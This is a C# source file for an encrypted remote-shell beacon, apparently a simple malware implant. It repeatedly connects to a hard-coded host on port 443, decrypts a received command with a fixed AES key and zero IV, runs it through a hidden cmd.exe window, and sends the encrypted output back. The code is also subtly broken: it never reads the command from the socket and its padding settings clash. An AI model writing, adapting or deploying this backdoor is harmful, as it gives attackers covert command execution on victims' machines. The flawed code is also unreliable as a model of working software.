using System.Net.Sockets;
using System.Security.Cryptography;
using System.Text;

public class EncryptedBeacon
{
    static string key = "lemmyz";
    public static byte[] AESEncrpt(byte[] bPlaintext, string key)
    {
        using (AesManaged aes = new AesManaged())
        {
            using (SHA256 sha256 = SHA256.Create())
            {

                aes.Key = sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
            }

            aes.IV = new byte[16];
            aes.Mode = CipherMode.CBC;

            ICryptoTransform encryptor = aes.CreateEncryptor(aes.Key, aes.IV);

            using (MemoryStream ms = new MemoryStream())
            {
                using (CryptoStream cs = new CryptoStream(ms, encryptor, CryptoStreamMode.Write))
                {
                    cs.Write(bPlaintext, 0, bPlaintext.Length);
                }
                return ms.ToArray();
            }
        }
    }

    public static byte[] AESDecrypt(byte[] bCiphertext, string key)
    {
        using (AesManaged aes = new AesManaged())
        {
            using (SHA256 sha256 = SHA256.Create())
            {
                aes.Key = sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
            }

            aes.IV = new byte[16];
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.Zeros;

            ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV);

            using (MemoryStream ms = new MemoryStream(bCiphertext))
            {
                using (CryptoStream cs = new CryptoStream(ms, decryptor, CryptoStreamMode.Read))
                {
                    using (MemoryStream decrypted = new MemoryStream())
                    {
                        cs.CopyTo(decrypted);
                        return decrypted.ToArray();
                    }
                }
            }
        }
    }
    public static string executeCommand(string cmd)
    {
        System.Diagnostics.Process proc = new System.Diagnostics.Process();
        System.Diagnostics.ProcessStartInfo si = new System.Diagnostics.ProcessStartInfo();
        si.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
        si.FileName = "cmd.exe";
        si.Arguments = "/c " + cmd;
        si.UseShellExecute = false;
        proc.StartInfo = si;
        proc.StartInfo.RedirectStandardOutput = true;
        proc.StartInfo.RedirectStandardError = true;
        proc.Start();

        string result = proc.StandardOutput.ReadToEnd();
        if (result == String.Empty)
        {
            result = proc.StandardError.ReadToEnd();
        }

        proc.WaitForExit();

        return result;
    }
    public static void conntectTo(string rhost, int rport)
    {
        Int32 port = rport;
        String cmd = "";
        TcpClient client = new TcpClient(rhost, port);
        NetworkStream tcpStream = client.GetStream();

        byte[] buffer = new Byte[256];

        cmd = System.Text.Encoding.ASCII.GetString(AESDecrypt(buffer, key));

        string cmdOutput = executeCommand(cmd);

        byte[] msg = System.Text.Encoding.ASCII.GetBytes(cmdOutput);
        msg = AESEncrpt(msg, key);
        tcpStream.Write(msg, 0, msg.Length);

        tcpStream.Close();
        client.Close();
    }

    public static void Main(string[] args)
    {
        while (true)
        {
            conntectTo("10.10.10.10", 443);
        }
    }

}